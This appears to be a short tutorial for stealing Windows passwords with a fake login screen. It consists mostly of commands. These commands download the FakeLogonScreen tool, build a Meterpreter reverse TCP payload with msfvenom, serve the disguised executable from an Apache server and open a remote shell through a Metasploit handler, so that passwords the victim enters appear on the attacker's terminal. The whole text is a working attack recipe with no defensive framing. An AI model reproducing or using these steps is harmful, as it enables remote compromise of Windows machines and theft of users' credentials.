# Windows Password Fishing with Fake Login Screen

```bash
# Step 1: Download Fake Login Screen
# Start Kali Linux machine and download the fake login screen
wget https://github.com/bitsadmin/fakelogonscreen/releases/download/v1.0.0/FakeLogonScreen.zip
unzip FakeLogonScreen.zip

# Step 2: Create Malicious Payload
# Use msfvenom to create a Meterpreter reverse TCP shell payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=<listening-ip> lport=<listening-port> -f exe >> FakePayload.exe

# Step 3: Set up Web Server
# Create a directory named "share" and copy the payload into it
sudo mkdir /var/www/html/share
sudo cp FakePayload.exe /var/www/html/share/
sudo service apache2 start

# Step 4: Access the Payload
# Open Windows 10 machine's browser and navigate to the server
# http://<ip-address-of-attacking-machine>/share
# Download the file from the HTTP Server

# Step 5: Exploit with Metasploit
# Start Metasploit tool on Kali Linux machine
msfconsole
use multi/handler
set LHOST <ip-address-of-your-machine>
set LPORT 4444
set payload windows/meterpreter/reverse_tcp
run

# Step 6: Upload and Execute the Payload
# Upload the file to the Windows machine
upload /var/www/html/share/FakePayload.exe

# Enter the Windows command prompt
shell

# Navigate to the download directory and run the .exe file
cd C:\Users\<username>\Downloads
FakePayload.exe

# Step 7: Password Retrieval
# Enter the password when prompted
# Correct or incorrect feedback will be displayed on the Meterpreter terminal

